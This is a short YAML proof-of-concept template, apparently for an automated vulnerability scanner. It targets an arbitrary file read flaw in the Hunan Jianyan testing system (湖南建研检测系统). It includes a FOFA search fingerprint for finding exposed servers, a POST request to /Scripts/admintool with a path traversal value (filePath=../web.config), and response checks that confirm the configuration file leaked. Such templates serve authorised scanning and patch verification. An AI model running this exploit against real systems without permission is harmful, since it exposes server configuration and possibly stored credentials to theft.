id: poc-yaml-hunanjianyan-ds-file-anyfile-read
info:
  name: 湖南建研检测系统 file 任意文件读取漏洞
  severity: high
  tags:
  - 文件读取
  finger: 湖南建研检测系统
  fofa: body="/Content/Theme/Standard/webSite/login.css"
requests:
- method: POST
  path: /Scripts/admintool?type=file
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: filePath=../web.config
  expression: status_code == 200 && contains(body,"web.config") && contains(body,"</system.web>")
    && contains(body,"<configuration>") && contains(content_type,"text/json")
variables: {}
transport: http
